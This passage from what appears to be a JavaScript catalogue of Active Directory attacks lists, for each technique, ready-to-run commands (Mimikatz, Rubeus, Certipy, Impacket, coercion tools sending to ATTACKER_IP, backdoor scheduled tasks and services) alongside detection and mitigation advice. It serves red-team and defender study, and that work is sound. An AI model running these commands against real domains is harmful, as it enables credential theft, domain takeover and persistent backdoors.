  },
  {
    name: "Shadow Credentials",
    description: "Abuse write access to a target's msDS-KeyCredentialLink attribute to add attacker-controlled credentials, enabling PKINIT authentication as that account.",
    prerequisites: ["Write access to target's msDS-KeyCredentialLink attribute", "ADCS with certificate-based authentication enabled (or Windows Hello for Business)"],
    steps: [
      "Add shadow credential: certipy shadow auto -u attacker@domain.local -p password -account TARGET$",
      "Or with Whisker: Whisker.exe add /target:TARGET$ /domain:domain.local /dc:DC_IP",
      "Obtain a certificate for the target account",
      "Authenticate using the certificate: Rubeus.exe asktgt /user:TARGET$ /certificate:cert.pfx /password:pfx_pass /ptt",
      "Request NTLM hash via U2U: Rubeus.exe asktgt /user:TARGET$ /certificate:cert.pfx /getcredentials",
      "Use the hash for lateral movement or DCSync (if target is a DC)"
    ],
    tools: ["Certipy", "Whisker", "pyWhisker", "Rubeus", "DSInternals"],
    detection: "Monitor changes to msDS-KeyCredentialLink attribute (Event ID 5136). Alert on additions to KeyCredentialLink by non-Azure AD Connect accounts. Detect PKINIT authentication following KeyCredentialLink modifications.",
    mitigation: "Restrict write access to msDS-KeyCredentialLink. Monitor attribute changes in AD. Implement strict ACLs on computer and user objects. Audit delegation of KeyCredentialLink write access."
  },
  {
    name: "LAPS Abuse",
    description: "Read the LAPS-managed local administrator password from Active Directory if the current user has the required read permissions on the ms-Mcs-AdmPwd attribute.",
    prerequisites: ["Read access to ms-Mcs-AdmPwd attribute on target computer objects", "LAPS deployed in the environment"],
    steps: [
      "Check LAPS deployment: Get-DomainComputer -Properties ms-mcs-admpwdexpirationtime | Where-Object { $_.'ms-mcs-admpwdexpirationtime' -ne $null }",
      "Check read access: Get-DomainObjectAcl -Identity 'CN=TARGET,CN=Computers,DC=domain,DC=local' -ResolveGUIDs | Where-Object { $_.ObjectAceType -match 'ms-Mcs-AdmPwd' }",
      "Read password: Get-DomainComputer TARGET -Properties ms-mcs-admpwd | Select-Object ms-mcs-admpwd",
      "Or with LAPSToolkit: Get-LAPSComputers",
      "Use the password for local admin access: crackmapexec smb TARGET -u administrator -p 'LAPS_PASSWORD' --local-auth"
    ],
    tools: ["PowerView", "LAPSToolkit", "CrackMapExec", "ldapsearch", "pyLAPS"],
    detection: "Monitor read access to ms-Mcs-AdmPwd attribute. Enable auditing on LAPS password reads. Alert on bulk LAPS password reads from a single account.",
    mitigation: "Restrict ms-Mcs-AdmPwd read permissions to specific admin groups only. Use LAPS v2 (Windows LAPS) with encrypted passwords. Implement just-in-time access for LAPS credentials. Audit LAPS ACLs regularly."
  },
  {
    name: "GPO Abuse",
    description: "Modify a Group Policy Object to execute arbitrary code on computers/users within its scope. Can create scheduled tasks, deploy software, or modify security settings.",
    prerequisites: ["Write access to a GPO (GPC-File-Sys-Path or GPO ACLs)", "GPO linked to a target OU containing desired targets"],
    steps: [
      "Enumerate GPO permissions: Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match 'WriteProperty|WriteDacl|WriteOwner|GenericAll|GenericWrite' }",
      "Identify GPO links: Get-DomainOU | Select-Object name, gplink",
      "Modify GPO with SharpGPOAbuse: SharpGPOAbuse.exe --AddComputerTask --TaskName 'Backdoor' --Author 'NT AUTHORITY\\SYSTEM' --Command 'cmd.exe' --Arguments '/c net localgroup administrators attacker /add' --GPOName 'Vulnerable GPO'",
      "Or create immediate scheduled task via GPO preferences",
      "Wait for GPO refresh (default 90 minutes) or force: gpupdate /force on target"
    ],
    tools: ["SharpGPOAbuse", "PowerView", "pyGPOAbuse", "GPMC"],
    detection: "Monitor GPO modifications (Event ID 5136 for directory changes). Alert on changes to GP file system path. Detect new scheduled tasks or scripts added via GPO. Monitor for GPO version number changes.",
    mitigation: "Restrict GPO modification permissions to specific admin groups. Implement change control for GPO modifications. Enable advanced auditing on GPO objects. Regularly audit GPO ACLs."
  },
  {
    name: "PrintNightmare (CVE-2021-34527)",
    description: "Exploit the Windows Print Spooler service to achieve remote code execution or local privilege escalation by loading a malicious DLL via AddPrinterDriverEx.",
    prerequisites: ["Print Spooler service running on target (enabled by default)", "Valid domain credentials for remote exploitation", "Attacker-controlled SMB share hosting malicious DLL"],
    steps: [
      "Host malicious DLL on SMB share: smbserver.py share ./malicious/ -smb2support",
      "Remote exploitation: CVE-2021-1675.py domain/user:password@TARGET '\\\\ATTACKER_IP\\share\\evil.dll'",
      "Local privilege escalation variant does not require SMB share",
      "DLL executes as SYSTEM on the target",
      "Add admin user or establish C2 callback from the DLL"
    ],
    tools: ["Impacket", "cube0x0 exploit", "SharpPrintNightmare", "Mimikatz misc::printnightmare"],
    detection: "Monitor for new printer driver installations. Detect DLL loads by spoolsv.exe from unusual paths. Alert on spoolsv.exe spawning child processes. Monitor Event ID 808 (print driver installation).",
    mitigation: "Disable Print Spooler service on systems that do not need it (especially domain controllers). Apply Microsoft patches. Restrict printer driver installation via Group Policy. Monitor Point and Print restrictions."
  },
  {
    name: "ZeroLogon (CVE-2020-1472)",
    description: "Exploit a flaw in the Netlogon Remote Protocol (MS-NRPC) to set a domain controller's machine account password to an empty string, enabling DCSync.",
    prerequisites: ["Network access to DC's Netlogon service (TCP port 135)", "No patch applied for CVE-2020-1472"],
    steps: [
      "Test vulnerability (non-destructive): zerologon_tester.py DC_NAME DC_IP",
      "Exploit to set empty password: cve-2020-1472-exploit.py DC_NAME DC_IP",
      "DCSync with empty password: secretsdump.py -just-dc domain/DC_NAME$@DC_IP -no-pass",
      "Restore DC password to avoid breakage: restorepassword.py domain/DC_NAME@DC_NAME -target-ip DC_IP -hexpass ORIGINAL_HASH",
      "CRITICAL: Failure to restore the password will break domain replication"
    ],
    tools: ["dirkjanm zerologon exploits", "Impacket (secretsdump.py)", "Mimikatz lsadump::zerologon"],
    detection: "Monitor for Netlogon authentication attempts with all-zero client credentials. Alert on Event ID 4742 (computer account changed) for domain controllers. Detect anomalous MS-NRPC traffic patterns.",
    mitigation: "Apply Microsoft security patches immediately. Enable domain controller enforcement mode. Monitor for unpatched systems. Implement network segmentation to limit direct DC access."
  },
  {
    name: "PetitPotam (NTLM Coercion)",
    description: "Coerce NTLM authentication from a target machine using the MS-EFSRPC (Encrypting File System Remote Protocol). Commonly chained with NTLM relay attacks.",
    prerequisites: ["Network access to target's MS-EFSRPC endpoint (TCP 445 or 135)", "In unauthenticated variant, no credentials required"],
    steps: [
      "Set up relay or capture: ntlmrelayx.py -t ldap://DC_IP --escalate-user attacker",
      "Or for ADCS relay: ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp --adcs --template DomainController",
      "Trigger authentication: PetitPotam.py ATTACKER_IP TARGET_IP",
      "Unauthenticated variant: PetitPotam.py ATTACKER_IP TARGET_IP (no creds needed on unpatched systems)",
      "Capture or relay the incoming NTLM authentication"
    ],
    tools: ["PetitPotam", "Impacket (ntlmrelayx.py)", "Responder"],
    detection: "Monitor for EFS-related RPC calls to unusual destinations. Detect NTLM authentication to external IPs. Alert on certificate enrollment following NTLM authentication from DC accounts.",
    mitigation: "Apply Microsoft patches. Disable EFS where not needed. Enable EPA on all services. Require packet signing. Disable NTLM where possible. Enable LDAP signing and channel binding."
  },
  {
    name: "DFSCoerce",
    description: "Coerce NTLM authentication using the MS-DFSNM (Distributed File System Namespace Management) protocol. Similar to PetitPotam but targets a different RPC interface.",
    prerequisites: ["Valid domain credentials", "Target with DFS Namespace service accessible"],
    steps: [
      "Set up relay: ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp --adcs --template DomainController",
      "Trigger authentication: dfscoerce.py -u user -p password -d domain.local ATTACKER_IP TARGET_IP",
      "Capture or relay the incoming NTLM authentication",
      "Chain with ADCS relay for certificate-based domain takeover"
    ],
    tools: ["DFSCoerce", "Impacket (ntlmrelayx.py)", "Coercer"],
    detection: "Monitor for unusual DFS RPC calls. Detect NTLM authentication to unexpected destinations. Alert on DFS management RPC from non-admin workstations.",
    mitigation: "Enable SMB signing. Disable NTLM where possible. Apply patches. Restrict DFS management access. Enable EPA on services."
  },
  {
    name: "Skeleton Key",
    description: "Inject a master password into the LSASS process on a domain controller that works alongside all existing passwords. Any account can authenticate with the skeleton key password.",
    prerequisites: ["Domain Admin or SYSTEM access on a domain controller", "SeDebugPrivilege to inject into LSASS"],
    steps: [
      "On the DC, inject skeleton key: mimikatz privilege::debug 'misc::skeleton'",
      "Default skeleton key password is 'mimikatz'",
      "Authenticate as any user with the skeleton key: runas /user:domain\\anyuser cmd (password: mimikatz)",
      "Original passwords continue to work alongside the skeleton key",
      "Skeleton key is in-memory only and does not survive DC reboot"
    ],
    tools: ["Mimikatz"],
    detection: "Monitor LSASS process for DLL injection. Detect authentication anomalies where users authenticate from unusual locations. Enable LSA protection (RunAsPPL) which prevents this attack. Monitor for Mimikatz artifacts.",
    mitigation: "Enable LSA protection (RunAsPPL) on domain controllers. Implement Credential Guard. Use multi-factor authentication. Monitor LSASS integrity. Restrict physical and remote access to DCs."
  },
  {
    name: "DCShadow",
    description: "Register a rogue domain controller and push malicious changes to AD via replication. Can modify any AD object without standard event logging.",
    prerequisites: ["Domain Admin privileges", "Ability to register a new DC via SPN modification"],
    steps: [
      "Start DCShadow server: mimikatz lsadump::dcshadow /object:targetuser /attribute:sidhistory /value:S-1-5-21-xxx-500",
      "Push the change: mimikatz lsadump::dcshadow /push (from a second mimikatz instance with DA privs)",
      "Can modify any attribute: SIDHistory, primaryGroupID, ACLs, SPNs",
      "Changes replicate to legitimate DCs via normal replication",
      "Minimal logging as changes appear to come from a DC"
    ],
    tools: ["Mimikatz"],
    detection: "Monitor for new nTDSDSA objects in the configuration partition. Detect SPN changes (GC/* and E3514235-4B06-11D1-AB04-00C04FC2DCD2/*) on non-DC computer accounts. Monitor for replication from unrecognized sources.",
    mitigation: "Monitor for rogue DC registration. Implement strict change control on AD. Enable advanced replication monitoring. Restrict who can modify SPNs. Use Microsoft ATA/ATP for DC-related anomalies."
  },
  {
    name: "NTLM Downgrade (Drop the MIC)",
    description: "Remove the MIC (Message Integrity Code) from NTLM authentication to enable relay attacks against targets that would otherwise detect tampering.",
    prerequisites: ["Man-in-the-middle position", "Target systems vulnerable to MIC removal (pre-patch)"],
    steps: [
      "Configure ntlmrelayx to remove MIC: ntlmrelayx.py -t ldaps://DC_IP --remove-mic",
      "Capture NTLM authentication via Responder or coercion",
      "Relay modified authentication to LDAPS for ACL abuse",
      "Add attacker to privileged groups or grant DCSync rights"
    ],
    tools: ["Impacket (ntlmrelayx.py)", "Responder"],
    detection: "Monitor for NTLM authentication without MIC where MIC is expected. Detect LDAP modifications from non-admin accounts. Alert on privilege escalation events following NTLM relay patterns.",
    mitigation: "Apply all NTLM security patches. Enable EPA on LDAP/LDAPS. Require LDAP signing and channel binding. Disable NTLM where possible."
  },
  {
    name: "Password Spraying",
    description: "Attempt authentication with a common password against many domain accounts. Avoids account lockout by using one password per lockout window across all accounts.",
    prerequisites: ["List of valid domain usernames", "Knowledge of the password policy (lockout threshold and window)"],
    steps: [
      "Enumerate valid users: kerbrute userenum -d domain.local usernames.txt --dc DC_IP",
      "Check password policy: net accounts /domain (note lockout threshold and observation window)",
      "Spray one password: crackmapexec smb DC_IP -u users.txt -p 'Spring2024!' --no-bruteforce",
      "Or with Kerbrute: kerbrute passwordspray -d domain.local users.txt 'Spring2024!'",
      "Wait for lockout window between attempts",
      "Try common patterns: Season+Year+!, CompanyName+123, Welcome1"
    ],
    tools: ["CrackMapExec", "Kerbrute", "Spray", "DomainPasswordSpray.ps1", "Rubeus brute"],
    detection: "Monitor Event ID 4771 (Kerberos pre-auth failure) and 4625 (failed logon). Alert on multiple authentication failures with the same password across different accounts. Detect patterns of one-attempt-per-account authentication.",
    mitigation: "Implement account lockout policies. Use Azure AD Password Protection to block common passwords. Enable MFA. Monitor for spray patterns. Implement fine-grained password policies with dictionary checks."
  },
  {
    name: "Kerberos Delegation Abuse via S4U2Self",
    description: "Abuse the S4U2Self Kerberos extension to obtain a service ticket to yourself on behalf of any user, useful when combined with constrained delegation.",
    prerequisites: ["Control of an account with an SPN (or a computer account)", "TrustedToAuthForDelegation flag for protocol transition"],
    steps: [
      "Identify accounts with protocol transition: Get-DomainUser -TrustedToAuth -Properties samaccountname, msds-allowedtodelegateto, useraccountcontrol",
      "Request S4U2Self ticket: Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:administrator /self",
      "Chain with S4U2Proxy: Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target",
      "Use alternate services: /altservice:ldap,host,http,wsman",
      "Access target service as the impersonated user"
    ],
    tools: ["Rubeus", "Impacket (getST.py)", "Kekeo"],
    detection: "Monitor for S4U2Self and S4U2Proxy requests in Kerberos event logs. Alert on delegation requests for privileged accounts. Detect service ticket requests through protocol transition.",
    mitigation: "Minimize accounts with TrustedToAuthForDelegation. Add privileged accounts to Protected Users. Set 'Account is sensitive and cannot be delegated' on admin accounts."
  },
  {
    name: "SID History Injection",
    description: "Add a privileged SID (e.g., Enterprise Admin) to an account's SID History attribute, granting the account privileges of the injected SID across trusts.",
    prerequisites: ["Domain Admin or replication privileges (for DCShadow variant)", "Access to modify SID History attribute"],
    steps: [
      "Via Mimikatz on DC: mimikatz privilege::debug 'sid::add /sam:targetuser /new:S-1-5-21-PARENT-519'",
      "Via DCShadow: mimikatz lsadump::dcshadow /object:targetuser /attribute:sidhistory /value:S-1-5-21-xxx-512",
      "The target user now has Enterprise Admin or Domain Admin privileges",
      "Verify: whoami /all (should show injected SID in token)",
      "This persists across reboots and is not in-memory only"
    ],
    tools: ["Mimikatz", "DSInternals"],
    detection: "Monitor Event ID 4765 (SID History added). Alert on SID History values containing privileged SIDs (512, 519, 544). Detect accounts with SID History that does not match migration history.",
    mitigation: "Enable SID filtering on domain trusts. Monitor SID History changes. Restrict who can modify SID History. Regularly audit SID History attributes across the domain."
  },
  {
    name: "Diamond Ticket",
    description: "Modify a legitimate TGT's PAC to add privileged group memberships. More evasive than a Golden Ticket because it uses a real TGT structure from the KDC.",
    prerequisites: ["krbtgt AES key or NTLM hash", "Valid domain credentials to request a legitimate TGT"],
    steps: [
      "Request a legitimate TGT: Rubeus.exe asktgt /user:normaluser /password:Password123 /enctype:aes256",
      "Modify the PAC in the ticket: Rubeus.exe diamond /krbkey:KRBTGT_AES256_KEY /user:normaluser /password:Password123 /enctype:aes256 /ticketuser:administrator /ticketuserid:500 /groups:512",
      "The resulting ticket is a modified legitimate TGT with DA group in PAC",
      "Inject the ticket: Rubeus.exe ptt /ticket:modified_ticket",
      "This bypasses Golden Ticket detections that look for forged ticket artifacts"
    ],
    tools: ["Rubeus", "Mimikatz"],
    detection: "Compare PAC contents with actual AD group membership. Detect TGT modifications by validating PAC signatures. Monitor for discrepancies between ticket group membership and AD group membership.",
    mitigation: "Rotate krbtgt password regularly (twice). Implement PAC validation. Monitor for Kerberos anomalies. Use Protected Users group for privileged accounts."
  },
  {
    name: "Sapphire Ticket",
    description: "Similar to Diamond Ticket but uses S4U2Self+U2U to obtain a legitimate PAC for another user, then embeds it into a new TGT. Hardest forged ticket variant to detect.",
    prerequisites: ["krbtgt AES key", "Valid domain credentials"],
    steps: [
      "Request a legitimate TGT: Rubeus.exe asktgt /user:normaluser /password:Password123",
      "Forge sapphire ticket: Rubeus.exe diamond /krbkey:KRBTGT_AES256_KEY /user:normaluser /password:Password123 /enctype:aes256 /ticketuser:administrator /ticketuserid:500 /groups:512 /sapphire",
      "The /sapphire flag uses S4U2Self+U2U to get the real PAC of the impersonated user",
      "Inject the ticket and access resources as the target user",
      "PAC is fully legitimate, making detection extremely difficult"
    ],
    tools: ["Rubeus"],
    detection: "Extremely difficult to detect as the PAC is legitimate. Monitor for S4U2Self requests followed by unusual TGT usage. Correlate Kerberos ticket usage with actual user activity patterns. Behavioral analytics are the best detection method.",
    mitigation: "Rotate krbtgt password regularly. Implement behavioral analytics for Kerberos usage. Monitor for S4U2Self abuse. Use Protected Users group."
  },
  {
    name: "DACL Abuse - GenericAll on User",
    description: "Exploit GenericAll permission on a user object to reset their password, set an SPN for Kerberoasting, or modify their attributes for further attacks.",
    prerequisites: ["GenericAll, WriteProperty, or WriteDacl permission on a target user object"],
    steps: [
      "Identify ACL abuse paths: Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match 'GenericAll' }",
      "Reset user password: net user targetuser NewPassword123! /domain",
      "Set SPN for Kerberoasting: Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn'}",
      "Enable ASREPRoast: Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304}",
      "Grant DCSync rights via WriteDacl: Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=local' -PrincipalIdentity attacker -Rights DCSync"
    ],
    tools: ["PowerView", "BloodHound", "BloodyAD", "Impacket (dacledit.py)"],
    detection: "Monitor Event ID 5136 (directory object modified). Alert on password resets by non-helpdesk accounts. Detect SPN additions to user accounts. Monitor ACL changes on domain objects.",
    mitigation: "Regularly audit ACLs on privileged objects. Implement least privilege. Use AdminSDHolder to protect privileged accounts. Monitor for ACL modifications. Deploy BloodHound for ACL analysis."
  },
  {
    name: "DACL Abuse - WriteDacl on Domain",
    description: "Abuse WriteDacl permission on the domain object to grant yourself DCSync rights, enabling extraction of all domain password hashes.",
    prerequisites: ["WriteDacl permission on the domain object (or a parent container)"],
    steps: [
      "Verify WriteDacl: Get-DomainObjectAcl -Identity 'DC=domain,DC=local' -ResolveGUIDs | Where-Object { $_.SecurityIdentifier -eq 'ATTACKER_SID' -and $_.ActiveDirectoryRights -match 'WriteDacl' }",
      "Grant DCSync rights: Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=local' -PrincipalIdentity attacker -Rights DCSync",
      "Verify rights: Get-DomainObjectAcl -Identity 'DC=domain,DC=local' -ResolveGUIDs | Where-Object { $_.SecurityIdentifier -eq 'ATTACKER_SID' }",
      "DCSync: mimikatz lsadump::dcsync /domain:domain.local /user:krbtgt",
      "Clean up (optional): Remove-DomainObjectAcl -TargetIdentity 'DC=domain,DC=local' -PrincipalIdentity attacker -Rights DCSync"
    ],
    tools: ["PowerView", "BloodHound", "Impacket (dacledit.py)", "BloodyAD"],
    detection: "Monitor Event ID 5136 for ACL changes on the domain object. Alert on addition of replication rights to non-DC accounts. Detect new ACEs with GetChanges/GetChangesAll GUIDs.",
    mitigation: "Restrict WriteDacl on domain object to Domain Admins only. Monitor ACL changes on critical AD objects. Implement tiered administration. Regular ACL audits."
  },
  {
    name: "DACL Abuse - WriteOwner",
    description: "Abuse WriteOwner permission to take ownership of an AD object, then grant yourself full control via WriteDacl.",
    prerequisites: ["WriteOwner permission on a target AD object"],
    steps: [
      "Take ownership: Set-DomainObjectOwner -Identity targetobject -OwnerIdentity attacker",
      "Grant yourself GenericAll: Add-DomainObjectAcl -TargetIdentity targetobject -PrincipalIdentity attacker -Rights All",
      "Now exploit GenericAll on the target object",
      "For user objects: reset password, set SPN, modify attributes",
      "For group objects: add yourself as member"
    ],
    tools: ["PowerView", "BloodHound", "BloodyAD", "Impacket (owneredit.py)"],
    detection: "Monitor Event ID 4662 and 5136 for ownership changes. Alert on ownership transfers of privileged objects. Detect subsequent ACL modifications following ownership changes.",
    mitigation: "Restrict WriteOwner delegations. Monitor ownership changes on AD objects. Implement least privilege. Regular ACL audits."
  },
  {
    name: "Group Membership Abuse",
    description: "Add an attacker-controlled account to a privileged group by abusing write access (GenericAll, GenericWrite, or WriteProperty with member attribute).",
    prerequisites: ["Write access to a group object's member attribute"],
    steps: [
      "Identify writable groups: Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteProperty' }",
      "Add to group: Add-DomainGroupMember -Identity 'Domain Admins' -Members 'attacker'",
      "Or via net command: net group 'Domain Admins' attacker /add /domain",
      "Verify: Get-DomainGroupMember -Identity 'Domain Admins'",
      "Log off and back on to obtain new token with group membership"
    ],
    tools: ["PowerView", "net.exe", "BloodHound", "BloodyAD"],
    detection: "Monitor Event ID 4728/4732/4756 (member added to security group). Alert on additions to privileged groups. Detect group membership changes by non-admin accounts.",
    mitigation: "Restrict who can modify privileged group membership. Enable Just-In-Time (JIT) privileged access. Monitor privileged group changes. Use AdminSDHolder protection."
  },
  {
    name: "Coerced Authentication via Print Spooler (PrinterBug)",
    description: "Abuse the MS-RPRN RPC interface to force a remote system's machine account to authenticate to an attacker-controlled listener.",
    prerequisites: ["Valid domain credentials", "Print Spooler service running on target"],
    steps: [
      "Check if Print Spooler is running: ls \\\\TARGET\\pipe\\spoolss",
      "Start listener: Rubeus.exe monitor /interval:5 /nowrap (for unconstrained delegation)",
      "Or start Responder/ntlmrelayx for NTLM capture/relay",
      "Trigger authentication: SpoolSample.exe TARGET ATTACKER_SERVER",
      "Or with printerbug.py: printerbug.py domain/user:password@TARGET ATTACKER_IP",
      "Capture/relay the incoming machine account authentication"
    ],
    tools: ["SpoolSample", "printerbug.py (dirkjanm)", "Rubeus", "Impacket"],
    detection: "Monitor for RPC calls to the Print Spooler from unusual sources. Detect NTLM authentication from server accounts to non-DC destinations. Alert on spoolsv.exe network connections to non-standard destinations.",
    mitigation: "Disable Print Spooler on servers and domain controllers where printing is not required. Apply patches. Restrict RPC access. Monitor for coercion techniques."
  }
];

// ---------------------------------------------------------------------------
// 3. AD_PERSISTENCE — 20 persistence mechanisms
// ---------------------------------------------------------------------------

const AD_PERSISTENCE = [
  {
    name: "Golden Ticket Persistence",
    description: "Forge Kerberos TGTs using the krbtgt hash for persistent domain access. Survives password changes for all accounts except krbtgt itself (requires two rotations to invalidate).",
    command: "mimikatz kerberos::golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:HASH /startoffset:-10 /endin:600 /renewmax:10080 /ptt",
    detection: "Monitor for TGTs with abnormally long lifetimes. Detect accounts that do not exist in AD. Compare ticket encryption with krbtgt key versions. Alert on Kerberos activity from decommissioned accounts.",
    removal: "Rotate the krbtgt password TWICE with at least 12 hours between rotations (to allow replication). The second rotation invalidates all existing TGTs. Verify replication across all DCs before second rotation."
  },
  {
    name: "Silver Ticket Persistence",
    description: "Forge service tickets using compromised service account hashes for persistent access to specific services without contacting the KDC.",
    command: "mimikatz kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /ptt",
    detection: "Monitor for logon events (4624) without corresponding TGT requests (4768). Enable PAC validation on services. Deploy honey tokens to detect unauthorized access.",
    removal: "Rotate the compromised service account password. For computer accounts, reset the machine account password. Enable PAC validation on affected services. Verify no residual tickets in memory on compromised hosts."
  },
  {
    name: "AdminSDHolder Backdoor",
    description: "Add a backdoor ACE to AdminSDHolder. SDProp runs every 60 minutes and copies AdminSDHolder ACLs to all protected groups and accounts, restoring attacker access even if removed.",
    command: "Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -PrincipalIdentity backdooruser -Rights All",
    detection: "Regularly audit ACLs on AdminSDHolder object. Compare current ACLs against a known-good baseline. Monitor Event ID 5136 for changes to AdminSDHolder. Alert on non-standard ACEs.",
    removal: "Remove the malicious ACE from AdminSDHolder. Wait for SDProp to run (or trigger manually). Verify ACLs on all protected objects (Domain Admins, Enterprise Admins, etc.) to confirm the backdoor ACE is removed."
  },
  {
    name: "DCSync Backdoor (Replication Rights)",
    description: "Grant replication rights (GetChanges and GetChangesAll) to a low-privileged account, enabling persistent DCSync capability without Domain Admin membership.",
    command: "Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=local' -PrincipalIdentity backdooruser -Rights DCSync",
    detection: "Audit replication ACEs on the domain object. Monitor for non-DC accounts with replication rights. Alert on DCSync (Event ID 4662) from non-DC IP addresses. Regular ACL baseline comparison.",
    removal: "Remove replication rights from the backdoor account. Audit all ACEs on the domain object against a known-good baseline. Monitor for re-addition of replication rights."
  },
  {
    name: "Skeleton Key",
    description: "Inject a master password into LSASS on a domain controller. All accounts can authenticate with this password alongside their real password. In-memory only.",
    command: "mimikatz privilege::debug 'misc::skeleton'",
    detection: "Enable LSA protection (RunAsPPL) to prevent injection. Monitor LSASS memory integrity. Detect unusual authentication patterns (same source, many accounts). Monitor for Mimikatz artifacts in memory.",
    removal: "Restart the domain controller. Skeleton Key is memory-resident only and does not survive a reboot. After restart, investigate how the attacker obtained DA access and remediate the initial access vector."
  },
  {
    name: "DCShadow Persistence",
    description: "Register a rogue DC and push malicious changes via replication. Can modify any AD attribute with minimal logging. Changes persist in the AD database.",
    command: "mimikatz lsadump::dcshadow /object:targetuser /attribute:primarygroupid /value:512 (push from separate DA session)",
    detection: "Monitor for new nTDSDSA objects. Detect SPN changes on non-DC computers (GC/* and replication GUIDs). Alert on replication from unrecognized sources. Monitor configuration partition changes.",
    removal: "Identify and revert all malicious changes made via DCShadow. Audit affected objects against known-good baselines. Remove any rogue DC registrations. Rotate credentials of affected accounts."
  },
  {
    name: "SID History Backdoor",
    description: "Inject a privileged SID (e.g., Domain Admins SID 512 or Enterprise Admins SID 519) into a regular user's SID History for covert privilege escalation.",
    command: "mimikatz sid::add /sam:backdooruser /new:S-1-5-21-DOMAIN-512",
    detection: "Audit SID History attributes on all accounts. Alert on SID History values containing well-known privileged SIDs. Monitor Event ID 4765 (SID History added). Regular comparison against baseline.",
    removal: "Clear the malicious SID History entry from the affected account using ADSI Edit or DSInternals. Enable SID filtering on domain trusts. Verify removal across all DCs after replication."
  },
  {
    name: "GPO Persistence",
    description: "Create or modify a GPO to execute attacker payloads (scheduled tasks, startup scripts, software installation) on domain-joined machines at every policy refresh.",
    command: "SharpGPOAbuse.exe --AddComputerTask --TaskName 'SystemUpdate' --Author 'NT AUTHORITY\\SYSTEM' --Command 'C:\\Windows\\backdoor.exe' --GPOName 'Default Domain Policy'",
    detection: "Monitor GPO modifications (Event ID 5136). Track GP file system changes. Detect new scheduled tasks or scripts in SYSVOL. Alert on GPO version number changes. Baseline GPO configurations.",
    removal: "Remove the malicious GPO settings (scheduled task, script, etc.). Force GPO refresh on affected machines: gpupdate /force. Remove any deployed payloads from affected systems. Audit SYSVOL for unauthorized content."
  },
  {
    name: "ADCS Persistence (Stolen CA Certificate)",
    description: "Exfiltrate the CA private key to forge certificates for any domain user. Provides persistent access until the CA is decommissioned or its certificate is revoked.",
    command: "certipy ca -backup -ca 'CA-NAME' -u admin@domain.local -p password (or SharpDPAPI to extract CA key from DPAPI)",
    detection: "Monitor CA key access events. Audit certificate requests that do not match enrollment policies. Detect PKINIT authentication from forged certificates. Monitor CA backup operations.",
    removal: "Revoke the compromised CA certificate. Rebuild the CA infrastructure with new keys. Revoke all certificates issued by the compromised CA. Update trust stores across the environment."
  },
  {
    name: "Shadow Credentials Persistence",
    description: "Add a key credential to a target's msDS-KeyCredentialLink attribute. Enables PKINIT authentication as the target without knowing their password.",
    command: "certipy shadow auto -u attacker@domain.local -p password -account TARGET$",
    detection: "Monitor changes to msDS-KeyCredentialLink attribute (Event ID 5136). Alert on Key Credential additions by non-Azure AD Connect accounts. Baseline KeyCredentialLink values.",
    removal: "Remove the malicious entry from msDS-KeyCredentialLink attribute. Use Whisker: Whisker.exe remove /target:TARGET$ /deviceid:DEVICE_GUID. Or clear via ADSI Edit. Verify removal across all DCs."
  },
  {
    name: "Machine Account Persistence",
    description: "Create a computer account with a known password. Use it for RBCD attacks, SPN-based attacks, or as a persistent foothold. Survives user password changes.",
    command: "addcomputer.py -computer-name PERSIST$ -computer-pass 'PersistentPassword123!' domain/user:pass -dc-ip DC_IP",
    detection: "Monitor Event ID 4741 (computer account created). Alert on computer account creation by non-admin users. Track accounts created through MachineAccountQuota. Audit stale computer accounts.",
    removal: "Delete the malicious computer account. Set MachineAccountQuota to 0 to prevent future abuse. Audit all recently created computer accounts. Check for RBCD delegations from the account."
  },
  {
    name: "Scheduled Task Persistence (Domain Level)",
    description: "Create scheduled tasks on multiple domain systems via GPO or WMI for persistent code execution. Tasks can run as SYSTEM and survive reboots.",
    command: "schtasks /create /s TARGET /tn 'WindowsUpdate' /tr 'C:\\Windows\\backdoor.exe' /sc onstart /ru SYSTEM /f",
    detection: "Monitor Event ID 4698 (scheduled task created). Audit scheduled tasks across domain systems. Detect tasks with suspicious binaries or network paths. Baseline known scheduled tasks.",
    removal: "Delete the malicious scheduled task: schtasks /delete /s TARGET /tn 'WindowsUpdate' /f. Remove the payload binary. Audit all systems for similar tasks. Check GPO for task deployment."
  },
  {
    name: "Service Account Persistence",
    description: "Create or modify Windows services on domain systems for persistent execution. Services can be configured for automatic start and run as SYSTEM.",
    command: "sc \\\\TARGET create Updater binPath= 'C:\\Windows\\backdoor.exe' start= auto obj= LocalSystem",
    detection: "Monitor Event ID 7045 (new service installed) and 4697 (service installed on system). Audit service configurations across domain systems. Detect services with unusual binary paths.",
    removal: "Stop and delete the malicious service: sc \\\\TARGET stop Updater && sc \\\\TARGET delete Updater. Remove the payload. Audit all systems for similar services."
  },
  {
    name: "WMI Event Subscription Persistence",
    description: "Create WMI event subscriptions that execute attacker payloads in response to system events (logon, startup, timer). Highly persistent and difficult to detect.",
    command: "wmic /node:TARGET process call create \"powershell -enc BASE64_ENCODED_COMMAND\" (for creating __EventFilter + __EventConsumer + __FilterToConsumerBinding)",
    detection: "Monitor WMI event subscriptions: Get-WMIObject -Namespace root\\Subscription -Class __EventFilter. Detect new CommandLineEventConsumer and ActiveScriptEventConsumer objects. Monitor WMI activity logs.",
